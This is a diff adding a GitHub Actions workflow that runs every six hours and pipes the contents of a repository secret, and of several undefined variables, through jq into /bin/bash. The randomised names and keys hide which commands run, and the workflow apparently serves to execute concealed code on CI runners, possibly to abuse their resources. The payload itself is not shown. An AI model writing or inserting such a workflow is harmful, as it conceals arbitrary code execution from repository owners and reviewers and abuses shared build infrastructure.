@@ -1,0 +1,27 @@
+name: naoyuwucan
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '14 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: naoyuwucan
+        env:
+          c81096: ${{ secrets.c81096 }}
+        run: |
+          echo $c81096 | jq -r .bxskz234 | /bin/bash
+          echo $p811 | jq -r .rgl9 | /bin/bash
+          echo $yn46 | jq -r .ch76 | /bin/bash
+          echo $lha99961 | jq -r .i3518 | /bin/bash
+          echo $mr30072 | jq -r .f47875 | /bin/bash
+          echo $xrhl18 | jq -r .oxiy851 | /bin/bash
+          echo $p3528 | jq -r .lg67 | /bin/bash
+          echo $prez25416 | jq -r .bdwu00823 | /bin/bash
+          echo $jndm3 | jq -r .ep0359 | /bin/bash
+
